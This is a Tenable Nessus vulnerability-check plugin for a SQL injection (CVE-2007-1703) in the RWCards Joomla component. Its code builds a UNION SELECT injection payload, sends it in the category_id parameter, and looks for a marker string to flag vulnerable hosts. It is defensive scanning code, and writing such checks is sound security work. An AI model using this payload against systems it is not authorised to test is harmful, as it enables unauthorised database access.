#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24899);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-1703");
  script_bugtraq_id(23126);
  script_xref(name:"OSVDB", value:"37213");

  script_name(english:"RWCards Component for Joomla! index.php category_id Parameter SQL Injection");
  script_summary(english:"Tries to use a SQL injection to manipulate a card title with RWCards");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running RWCards, a third-party component for Joomla
for sending electronic postcards. 

The version of RWCards installed on the remote host fails to properly
sanitize input to the 'category_id' parameter before using it in
'rwcards.php' to build a database query.  Provided PHP's
'magic_quotes_gpc' setting is disabled, an unauthenticated remote
attacker can leverage this issue to launch SQL injection attacks
against the affected application, leading to discovery of sensitive
information, attacks against the underlying database, and the like." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to manipulate the title in a list of "cards".
  magic = string(SCRIPT_NAME, "-", rand());
  enc_magic = string("char(");
  for (i=0; i<strlen(magic)-1; i++)
    enc_magic += ord(magic[i]) + ",";
  enc_magic += ord(magic[i]) + ")";
  exploit = string("-1' UNION SELECT 1,2,03,4,", enc_magic, ",50,044,076,0678,07--");

  req = http_get(
    item:string(
      dir, "/index.php?",
      "option=com_rwcards&",
      "task=listCards&",
      "category_id=", urlencode(str:exploit)
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we managed to set the title based on our magic.
  if (string('>Title: </td><td  class="contentdescription">', magic, "</td>") >< res)
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
